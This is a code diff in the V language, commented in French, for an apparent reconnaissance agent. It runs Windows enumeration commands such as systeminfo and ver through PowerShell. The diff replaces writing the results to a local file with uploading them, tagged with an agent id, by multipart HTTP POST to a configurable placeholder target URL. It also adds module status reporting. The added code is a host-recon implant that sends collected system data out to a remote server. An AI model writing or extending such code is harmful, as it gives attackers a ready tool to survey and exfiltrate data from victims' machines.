@@ -1,5 +1,6 @@
 import os
 import time
+import net.http
 
 
 enum ModuleState as u8 {
@@ -37,6 +38,8 @@ struct Response{
 struct SharedVariable {
 	agent_identifier string = "<id-agent>" // de la forme "agent-x" ou x est le numèro de l'agent
 
+	number_of_module int = 3
+
     commandes_list []Commande = [
 		Commande{command: "systeminfo", type_shell: ShellType.powershell, id: "SYSTEMINFO"},
 		Commande{command: "ver", type_shell: ShellType.powershell, id: "WINVER"},
@@ -55,6 +58,7 @@ mut:
 	ip []u8 = [u8(127),0,0,1]
 	response_list []Response
 	module_state shared []ModuleState = [ModuleState.unknown, ModuleState.unknown, ModuleState.unknown]
+	module_state_description shared []string = ['','','']
 }
 
 fn main(){
@@ -62,7 +66,10 @@ fn main(){
 
 	sw := time.new_stopwatch()
 	shared_variable.module_ecoute()
-	println("[i] - fin d'éxecution. Temps d'énumeration  ${sw.elapsed().seconds()}")
+	rlock shared_variable {
+		println(show_all_module_status(shared_variable))
+	}
+		println("[i] - fin d'éxecution. Temps d'énumeration  ${sw.elapsed().seconds()}")
 }
 
 fn dump_shared_variable(sv &SharedVariable){
@@ -77,6 +84,22 @@ fn dump_shared_variable(sv &SharedVariable){
 		rlock sv.module_state {
 			println("	module state be like : ${sv.module_state}")
 		}
+}
+
+fn show_all_module_status(sv &SharedVariable) string {
+	mut rst := '\n'
+	unsafe {
+		for i in 0..sv.number_of_module {
+			rst += '==== Module ' + Module(i).str() + ' :\n'
+			rlock sv.module_state, sv.module_state_description {
+				rst += ' - status : ' + sv.module_state[i].str() + '\n'
+				rst += ' - description : ' + sv.module_state_description[i] + '\n'
+			}
+			rst += '\n'
+		}
+	}
+
+	return rst
 }
 
 // ------------------------------------------------------------------------- Module écoute
@@ -133,9 +156,10 @@ fn (shared sv SharedVariable) module_execution() {
     }
 }
 
-// ------------------------------------------------------------------------- Module envoie
+// ------------------------------------------------------------------------- Module envoie - import net.http
 fn (shared sv SharedVariable) module_envoie() {
 	dump_filename := 'agent_enumeration.txt' // argument modifiable à la compilation
+	target_url := '<url>' // argument modifiable représentant l'url ciblé de transmission des l'énumération
 
 	lock sv.module_state {
         sv.module_state[Module.envoie] = ModuleState.started
@@ -148,7 +172,7 @@ fn (shared sv SharedVariable) module_envoie() {
 		rlock sv.module_state {
 			s = sv.module_state[Module.execution]
 		}
-
+		// dès que le module d'exécution se termine, on break
 		if s == ModuleState.finish {
 			break
 		}
@@ -173,7 +197,36 @@ fn (shared sv SharedVariable) module_envoie() {
 	}
 	final_enum_file = final_enum_file.trim_space()
 
-	mut file := os.create(dump_filename) or {
+	// une fois les données récolté, on envoie le tout à l'API :
+	// la strucutre de donnée du fichier a envoyer
+    mut files := []http.FileData{}
+    
+    // adding file to the array
+    files << http.FileData {
+        filename:        dump_filename,
+        content_type:    "plain/text",
+        data:            final_enum_file
+    }
+
+    // PostMultipartFormConfig struct
+	cfg := http.PostMultipartFormConfig{
+		form:{
+			"id_agent": sv.agent_identifier
+		},
+		files: {
+			"file":    files
+		}
+	}
+
+    http.post_multipart_form(target_url, cfg) or {
+		lock sv.module_state, sv.module_state_description {
+        	sv.module_state[Module.envoie] = ModuleState.error
+			sv.module_state_description[Module.envoie] = "Error during POST request :\n" + err.str()
+    	}
+		return
+	}
+
+	/*mut file := os.create(dump_filename) or {
 		lock sv.module_state {
         	sv.module_state[Module.envoie] = ModuleState.error
     	}
@@ -185,7 +238,7 @@ fn (shared sv SharedVariable) module_envoie() {
     	}
 		return
 	}
-	file.close()
+	file.close()*/
 
 	lock sv.module_state {
         sv.module_state[Module.envoie] = ModuleState.finish
